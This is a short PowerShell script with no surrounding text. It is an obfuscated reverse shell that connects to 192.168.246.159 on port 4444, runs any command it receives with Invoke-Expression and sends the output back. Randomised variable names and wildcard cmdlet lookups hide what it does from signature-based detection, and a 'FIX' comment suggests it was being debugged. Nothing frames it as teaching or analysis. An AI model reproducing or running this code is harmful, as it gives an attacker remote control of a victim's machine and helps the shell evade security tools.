 $u4IBoL9H = 444+4000; 
 $JLBkPZ = '192.168.246.159'; 

 $N7ZSRxiq = & (Get-Command 'New-Obje?t' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] Net.Sockets.TCPClient($JLBkPZ, $u4IBoL9H); 
 $alT1 = $N7ZSRxiq.GetStream(); 
 $HuYk021y = & (Get-Command 'New-O?????' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] IO.StreamReader($alT1); 
 $ZNyIcjJ = & (Get-Command 'N?w-?bject' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] IO.StreamWriter($alT1); 
 $ZNyIcjJ.AutoFlush = $true; 
 $cS7qH = & (Get-Command 'New-O?????' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] System.Byte[] 1024; 
 $dtxsk = ""; 

while ($N7ZSRxiq.Connected) { 
    while ($alT1.DataAvailable) { 
        $s0WEe = $alT1.Read($cS7qH, 0, $cS7qH.Length); 
        $dtxsk = ([text.encoding]::UTF8).GetString($cS7qH, 0, $s0WEe) 
    }; 
    if ($N7ZSRxiq.Connected -and $dtxsk.Length -gt 1) { 
        # FIX: Added | Out-String to convert command output to a string
        $YS7fB = try { 
            & (Get-Command 'Inv?ke-Expre??ion' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] ($dtxsk) 2>&1 | & (Get-Command 'O?t-Str?ng' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] 
        } catch { 
            $_ | & (Get-Command 'O?t-Str?ng' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] 
        }; 
        $ZNyIcjJ.Write(($YS7fB + "`n")); 
        $dtxsk = "" 
    } 
}; 

 $N7ZSRxiq.Close(); 
 $alT1.Close(); 
 $HuYk021y.Close(); 
 $ZNyIcjJ.Close()